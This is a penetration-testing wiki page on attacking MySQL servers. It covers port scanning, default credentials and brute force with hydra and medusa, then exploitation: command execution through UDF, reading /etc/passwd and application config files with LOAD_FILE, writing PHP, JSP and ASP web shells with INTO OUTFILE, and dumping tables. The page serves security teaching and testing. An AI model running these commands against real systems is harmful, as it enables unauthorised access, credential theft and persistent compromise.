---
authors: ShutdownRepo, felixbillieres
category: infra
---

# MySQL

## Theory

MySQL is an open-source relational database management system (RDBMS) that uses the MySQL protocol for client-server communication. It typically runs on port `3306/TCP`. MySQL is widely used in web applications and can contain sensitive information such as user credentials, personal data, and application configurations.

MySQL supports various authentication methods:
* Native password authentication
* SHA-256 password authentication
* Caching SHA-2 password authentication
* Windows authentication (on Windows) - Rare, available in MySQL Enterprise Edition which can integrate with Windows AD credentials via MySQL Enterprise Authentication. Not available on all installations.

Exploiting MySQL can lead to:
* Data exfiltration
* Command execution on the database server (via User Defined Functions or file operations)
* Lateral movement within the network
* Privilege escalation

## Practice

### Enumeration

#### Port scanning

MySQL typically runs on port `3306/TCP`, but it can be configured to run on custom ports. MySQL uses only TCP/3306 by default. Some scanners may check UDP/3306, but no standard MySQL service listens on UDP.

::: tabs

=== Unix-like

```bash
# Basic port scan
nmap -p 3306 $TARGET

# Service version detection
nmap -p 3306 -sV $TARGET

# MySQL-specific scripts
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables,mysql-audit,mysql-enum $TARGET

# Scan UDP port (very rare, not standard)
nmap -sU -p 3306 $TARGET
```

=== Windows

```powershell
# Basic port scan using Test-NetConnection
Test-NetConnection -ComputerName $TARGET -Port 3306

# Using nmap (if available)
nmap -p 3306 -sV $TARGET
nmap -p 3306 --script mysql-info,mysql-empty-password $TARGET
```

:::

#### Service detection

MySQL service information can be detected using network scanning tools. The MySQL protocol requires a proper client handshake, making simple banner grabbing unreliable.

::: tabs

=== Unix-like

```bash
# Service version detection
nmap -p 3306 -sV $TARGET

# Using mysql client (if available)
mysql -h $TARGET -P 3306
```

=== Windows

```powershell
# Using nmap (if available)
nmap -p 3306 -sV $TARGET

# Using mysql client (if available)
mysql -h $TARGET -P 3306
```

:::

> [!NOTE]
> Simple banner grabbing via `nc` is unreliable because MySQL expects a client handshake. Service version detection using `nmap` or the MySQL client provides more reliable results.

### Authentication

#### Authentication enumeration

Check if MySQL allows anonymous connections or uses weak authentication.

::: tabs

=== Unix-like

```bash
# Check for empty password
nmap -p 3306 --script mysql-empty-password $TARGET

# Enumerate users (requires valid credentials with appropriate privileges)
# Replace $PASSWORD with actual password or use interactive mode
nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass=$PASSWORD $TARGET
```

=== Windows

```powershell
# Using nmap (if available)
nmap -p 3306 --script mysql-empty-password $TARGET
nmap -p 3306 --script mysql-users --script-args mysqluser=root,mysqlpass=$PASSWORD $TARGET
```

:::

> [!NOTE]
> The `mysql-users` NSE script requires valid credentials with appropriate privileges to enumerate users. The enumeration capabilities depend on the authentication method and user permissions.

### Default credentials

MySQL often uses default credentials, especially in development environments and on older servers:

* `root` / `<empty>`
* `root` / `root`
* `root` / `toor`
* `admin` / `admin`
* `mysql` / `mysql`

> [!NOTE]
> Since MySQL 5.7+, installation creates a random password and forces the user to set it. Default credentials like `root/root` or `root/toor` are mainly found on:
> * Old MySQL versions (pre-5.7)
> * Development environments and labs
> * Negligent administrator configurations

#### Bruteforce

::: tabs

=== Unix-like

```bash
# Using Hydra
hydra -l root -P /path/to/passwords.txt $TARGET mysql

# Using nmap
nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET

# Using Medusa
medusa -h $TARGET -u root -P /path/to/passwords.txt -M mysql
```

=== Windows

```powershell
# Using nmap (if available)
nmap -p 3306 --script mysql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET

# Using mysql client for basic credential testing
$users = Get-Content users.txt
$passwords = Get-Content passwords.txt
foreach ($user in $users) {
    foreach ($pass in $passwords) {
        try {
            mysql -h $TARGET -u $user -p$pass -e "SELECT 1" 2>$null
            if ($LASTEXITCODE -eq 0) {
                Write-Host "Valid: $user:$pass"
            }
        } catch {
            # Invalid credentials
        }
    }
}
```

:::

### Database enumeration

Once authenticated, databases, tables, and users can be enumerated.

::: tabs

=== Unix-like

```bash
# Using mysql client
mysql -h $TARGET -u $USER -p
mysql -h $TARGET -u $USER -p$PASSWORD
mysql -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"
```

=== Windows

```powershell
# Using mysql client
mysql -h $TARGET -u $USER -p
mysql -h $TARGET -u $USER -p$PASSWORD
mysql -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"

# Using PowerShell with mysql.exe (if available)
& mysql.exe -h $TARGET -u $USER -p$PASSWORD -e "SELECT @@version;"
```

:::

Useful SQL commands once connected:

```sql
-- Get MySQL version
SELECT @@version;

-- List databases
SHOW DATABASES;

-- Use a database
USE database_name;

-- List tables
SHOW TABLES;

-- Describe table structure
DESCRIBE table_name;
-- Or
SHOW COLUMNS FROM table_name;

-- List users
SELECT user, host FROM mysql.user;

-- Get current user
SELECT USER();
SELECT CURRENT_USER();

-- Check user privileges (for current user)
SHOW GRANTS;

-- Check user privileges for specific user (host may not always be known)
SHOW GRANTS FOR 'username'@'host';
```

> [!NOTE]
> When using `SHOW GRANTS FOR 'username'@'host'`, the host component may not always be known. `SHOW GRANTS;` without arguments shows privileges for the current user and is often sufficient.

### Exploitation

#### Command execution and file operations

MySQL can execute operating system commands through User Defined Functions (UDF) or by reading/writing files.

##### User Defined Functions (UDF)

UDF allows executing system commands through MySQL functions. UDF exploitation requires the ability to place a shared library in a loadable directory (often `plugin_dir`) and sufficient privileges to create the function (CREATE FUNCTION, and sometimes SUPER or ALTER depending on MySQL version and configuration).

```sql
-- Check if UDF is available
SELECT * FROM mysql.func;

-- Create UDF (requires write access to plugin directory and CREATE FUNCTION privilege)
-- This is typically done by loading a shared library
CREATE FUNCTION sys_exec RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

-- Execute command
SELECT sys_exec('whoami');
SELECT sys_eval('id');
```

> [!CAUTION]
> UDF execution requires specific privileges and library files. This method is complex and may not work on all MySQL installations. **On MySQL 8.0**, UDF exploitation is often blocked or complicated because:
> * `plugin_dir` is often not writable
> * Cryptographic validation has been introduced
> * 64-bit libraries are required
> 
> UDF exploitation works mainly on MySQL 5.x or poorly secured installations. Note that MariaDB environments may differ in their UDF implementation and restrictions.

##### File operations

MySQL can read and write files if the user has `FILE` privilege.

```sql
-- Check FILE privilege (host may not always be known)
SHOW GRANTS FOR 'username'@'host';
-- Or check current user privileges
SHOW GRANTS;

-- Read system files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Read configuration files
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('C:\\ProgramData\\MySQL\\MySQL Server 8.0\\my.ini');

-- Read application files
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write web shells (requires FILE privilege and writable web root)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' INTO OUTFILE '/var/www/html/shell.jsp';
SELECT '<% eval request("cmd") %>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp';

-- Write data to file
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';

-- Export with specific format
SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';
```

> [!WARNING]
> File operations require `FILE` privilege and appropriate file system permissions. The `secure_file_priv` variable may restrict file operations.
> 
> **Important notes:**
> * Since MySQL 5.6/5.7, `secure_file_priv` disables `INTO OUTFILE` outside of a dedicated directory. This parameter is often enabled, which prevents web shells via `OUTFILE`.
> * `LOAD_FILE` requires MySQL to have access to the file path, the file must be readable by the MySQL service OS user, and `secure_file_priv` may restrict read operations.

#### Data exfiltration

Sensitive data can be extracted from databases.

```sql
-- List all databases
SHOW DATABASES;

-- Use a database
USE database_name;

-- List tables
SHOW TABLES;

-- Extract data from a table
SELECT * FROM users;
```

### Navigation in database

#### Useful SQL queries

```sql
-- Get MySQL version
SELECT @@version;
SELECT VERSION();

-- Get current user
SELECT USER();
SELECT CURRENT_USER();
SELECT SYSTEM_USER();

-- Get current database
SELECT DATABASE();

-- List all databases
SHOW DATABASES;

-- List tables in current database
SHOW TABLES;

-- List tables in specific database
SHOW TABLES FROM database_name;

-- Describe table structure
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;
SHOW CREATE TABLE table_name;

-- Get table information
SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_ROWS, DATA_LENGTH, INDEX_LENGTH 
FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = 'database_name';

-- List columns in a table
SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE, COLUMN_DEFAULT 
FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA = 'database_name' AND TABLE_NAME = 'table_name';

-- Count rows in a table
SELECT COUNT(*) FROM table_name;

-- Search for specific data
SELECT * FROM table_name WHERE column_name LIKE '%search_term%';

-- List all users
SELECT user, host FROM mysql.user;

-- List user privileges (for current user)
SHOW GRANTS;

-- List user privileges for specific user (host may not always be known)
SHOW GRANTS FOR 'username'@'host';

-- Check user privileges (note: this query does not reflect all active privileges, especially since MySQL 8.0)
-- Reading mysql.user only shows global columns; privileges can be inherited via roles, mysql.db, mysql.tables_priv, etc.
-- Use SHOW GRANTS for a complete view of privileges
SELECT * FROM mysql.user WHERE user = 'username';

-- List stored procedures
SHOW PROCEDURE STATUS;
SELECT ROUTINE_NAME FROM information_schema.ROUTINES WHERE ROUTINE_TYPE = 'PROCEDURE';

-- List functions
SHOW FUNCTION STATUS;
SELECT ROUTINE_NAME FROM information_schema.ROUTINES WHERE ROUTINE_TYPE = 'FUNCTION';

-- List triggers
SHOW TRIGGERS;
SELECT TRIGGER_NAME FROM information_schema.TRIGGERS;

-- Get database size
SELECT 
    table_schema AS 'Database',
    ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.tables
GROUP BY table_schema;

-- Information schema queries
-- MySQL's information_schema database contains metadata about all databases and tables

-- List all databases (via information_schema)
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

-- List all tables (via information_schema)
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;

-- List all columns (via information_schema)
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE 
FROM information_schema.COLUMNS;

-- Get table statistics (via information_schema)
SELECT 
    TABLE_SCHEMA,
    TABLE_NAME,
    TABLE_ROWS,
    AVG_ROW_LENGTH,
    DATA_LENGTH,
    INDEX_LENGTH
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = 'database_name';
```

## Resources

### References

- [MySQL Reference Manual — FILE Privilege](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file)
- [MySQL Reference Manual — secure_file_priv System Variable](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv)
- [MySQL Reference Manual — SELECT ... INTO Statement](https://dev.mysql.com/doc/refman/8.0/en/select-into.html)
- [MySQL Reference Manual — LOAD_FILE() Function](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file)
- [HackTricks — Pentesting MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)

### Tools

- [MySQL Command-Line Client](https://dev.mysql.com/doc/refman/8.0/en/mysql.html)
